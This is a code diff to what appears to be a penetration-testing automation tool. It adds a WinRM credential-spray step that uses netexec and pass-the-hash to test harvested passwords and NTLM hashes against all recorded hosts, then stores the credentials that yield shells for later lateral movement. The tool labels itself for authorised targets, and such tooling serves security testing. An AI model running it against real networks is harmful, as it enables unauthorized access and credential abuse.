@@ -2223,6 +2223,20 @@ def _extract_finding(sid: str, output: str) -> "dict | None":
                     "summary": f"SMB readable shares: {len(files)} sensitive file(s)"[:140]}
         return None
 
+    # 2ap) winrm-spray: harvested creds valid on WinRM (reuse); a shell (Pwn3d!) is critical
+    if sid == "winrm-spray":
+        shell = re.findall(r"^✗ SHELL (.+?)\s{2}", output, re.M)
+        valid = re.findall(r"^✓ VALID (.+)$", output, re.M)
+        if shell:
+            shown = "; ".join(s.strip() for s in shell[:3]) + (f" +{len(shell) - 3}" if len(shell) > 3 else "")
+            return {"state": "VULNERABLE", "cve": cve, "risk": "CRITICAL",
+                    "summary": f"WinRM shell: {shown}"[:140]}
+        if valid:
+            shown = "; ".join(v.strip() for v in valid[:3]) + (f" +{len(valid) - 3}" if len(valid) > 3 else "")
+            return {"state": "EXPOSED", "cve": cve, "risk": "HIGH",
+                    "summary": f"valid WinRM creds: {shown}"[:140]}
+        return None
+
     # 2ao) winrm-enum: WinRM transport confirmed → evil-winrm target; Basic-over-HTTP is worse
     if sid == "winrm-enum":
         trans = re.findall(r"((?:HTTPS?) \d+) ✓", output)
@@ -2982,7 +2996,7 @@ _EXPLOIT_STEPS = {
     ],
     "winrm": [
         ("Confirm WinRM transport (5985 HTTP / 5986 HTTPS)", "winrm-enum"),
-        "Validate & spray creds and NTLM hashes against known users (watch lockout)",
+        ("Validate & spray creds and NTLM hashes against known users (watch lockout)", "winrm-spray"),
         "Valid creds or hash → interactive shell (evil-winrm; -H for pass-the-hash)",
         "Needs 'Remote Management Users' / admin membership — note who has access",
         "Via the shell: enumerate, upload tooling, run commands; reuse creds to pivot",
@@ -10005,6 +10019,74 @@ def _tool_winrm_enum(ip: str, port: int, proto: str) -> str:
     return f"WinRM enumeration — {ip}\n\n" + "\n".join(lines)
 
 
+# ── WinRM step 2: validate harvested creds/hashes against WinRM (reuse/lateral) ──
+_WINRMSPRAY_DEADLINE = 240       # s — overall cap
+
+
+def _winrm_hosts() -> list:
+    """Every DB host with WinRM open (5985/5986) — the validation surface."""
+    hosts = []
+    for row in fetch_hosts():
+        hip = row[0]
+        if any(p in (5985, 5986) and pr == "tcp" for p, pr, _st in fetch_ports(hip)):
+            hosts.append(hip)
+    return hosts
+
+
+def _tool_winrm_spray(ip: str, port: int, proto: str) -> str:
+    """WinRM step 2 tool: validate every harvested credential / NT hash against WinRM on all DB
+    hosts — a WinRM ACL (Remote Management Users / admin) is separate from SMB, so this confirms
+    who can actually get a shell here. Each pair is the account's own real secret, tried once per
+    host (no guessing, no lockout). netexec reports where each cred is valid and where it yields
+    a shell (Pwn3d!). Shell-capable creds are saved to smb-creds (feeds the WinRM shell step).
+    Pass-the-hash for NT hashes. No root. Raises without harvested creds or WinRM hosts."""
+    import time
+    nxc = shutil.which("netexec") or shutil.which("nxc")
+    if not nxc:
+        raise RuntimeError("netexec not found — install it to spray WinRM")
+    hosts = _winrm_hosts()
+    if not hosts:
+        raise RuntimeError("no WinRM hosts recorded — run winrm-enum (r1) / port enumeration first")
+    creds = _gather_all_smb_creds()[:_SMBSPRAY_MAX_CREDS]
+    if not creds:
+        raise RuntimeError("no harvested creds to spray — run the SMB phase (loot/gpp/dump) first")
+
+    deadline = time.time() + _WINRMSPRAY_DEADLINE
+    valids, shells = [], []                       # (host, who, secret)
+    for dom, user, secret in creds:
+        if time.time() > deadline:
+            break
+        is_hash = bool(re.fullmatch(r"[a-fA-F0-9]{32}", secret))
+        auth = ["-u", user] + (["-H", secret] if is_hash else ["-p", secret])
+        if dom:
+            auth += ["-d", dom]
+        _, out = _smb_run([nxc, "winrm", *hosts, *auth, "--continue-on-success"], 120)
+        who = f"{dom}\\{user}" if dom else user
+        for ln in out.splitlines():
+            m = re.match(r"WINRM\s+(\S+)\s+\d+\s+\S+\s+\[\+\]", ln)
+            if not m:
+                continue
+            (shells if "(Pwn3d!)" in ln else valids).append((m.group(1), who, secret))
+
+    if shells:                                    # persist shell-capable creds (canonical store: 445)
+        blocks = _load_manual_block(ip, 445, "tcp", "smb-creds")
+        for host, who, secret in shells:
+            line = f"! {who.split(chr(92))[-1]}:{secret} @ winrm on {host} [{host}]"
+            blocks.setdefault(host, [])
+            if line not in blocks[host]:
+                blocks[host].append(line)
+        _save_manual_block(ip, 445, "tcp", "smb-creds", blocks)
+
+    lines = [f"[*] {len(creds)} cred(s) × {len(hosts)} WinRM host(s)"]
+    for host, who, _s in dict.fromkeys((a[0], a[1], None) for a in shells):
+        lines.append(f"✗ SHELL {who} @ {host}  (Pwn3d!)")
+    for host, who, _s in dict.fromkeys((v[0], v[1], None) for v in valids):
+        lines.append(f"✓ VALID {who} @ {host}")
+    if not shells and not valids:
+        lines.append("· no WinRM access with the harvested creds")
+    return f"WinRM credential spray — {len(creds)}×{len(hosts)}  (reuse / lateral)\n\n" + "\n".join(lines)
+
+
 # tool key -> (short label shown in the checklist, runner(ip, port, proto) -> output str)
 _STEP_TOOLS = {
     "http-headers": ("HTTP headers (stdlib, no redirects)", _tool_http_headers),
@@ -10049,6 +10131,7 @@ _STEP_TOOLS = {
     "smb-foothold": ("foothold → spawn interactive admin session (psexec/evil-winrm)", _tool_smb_foothold),
     "smb-next": ("manual AD/SMB steps (context-aware, reference only)", _tool_smb_next),
     "winrm-enum": ("Confirm WinRM transport + auth (stdlib /wsman probe + netexec)", _tool_winrm_enum),
+    "winrm-spray": ("Validate harvested creds/hashes against WinRM (netexec → shell)", _tool_winrm_spray),
 }
 
 def _mins(seconds: int) -> str:
@@ -10108,6 +10191,7 @@ _STEP_TOOL_RUNS = {
     "smb-foothold":     ("impacket / evil-winrm", None),
     "smb-next":         ("reference · no scan", None),
     "winrm-enum":       ("Python + netexec", None),
+    "winrm-spray":      ("netexec winrm", f"{_mins(_WINRMSPRAY_DEADLINE)} min"),
 }
 
 
@@ -10269,6 +10353,11 @@ def _run_step_tool(ip: str, target: tuple, n: int) -> None:
         print(f"{YELLOW}   ⚠ SMB version-RCE scan{RESET}{DIM} — detection only (nmap NSE + netexec), "
               f"no exploitation / no unsafe probes · {RESET}{YELLOW}authorized targets only{RESET}"
               f"{DIM} · deadline {_SMBVULN_DEADLINE // 60} min{RESET}")
+    if tool_key == "winrm-spray":                 # real creds only — 1 try/host, no guessing
+        nc, nh = len(_gather_all_smb_creds()), len(_winrm_hosts())
+        print(f"{DIM}   validates {BOLD}{nc}{RESET}{DIM} harvested cred(s) against {BOLD}{nh}{RESET}"
+              f"{DIM} WinRM host(s) — real secrets, one try per host (no guessing, no lockout) · "
+              f"{RESET}{YELLOW}authorised targets only{RESET}{DIM} · deadline {_WINRMSPRAY_DEADLINE // 60} min{RESET}")
     if tool_key == "winrm-enum":                  # unauth transport confirm — no creds, no lockout
         print(f"{DIM}   unauthenticated /wsman probe on 5985/5986 (stdlib) + netexec banner — "
               f"read-only, no creds tried (no lockout){RESET}")
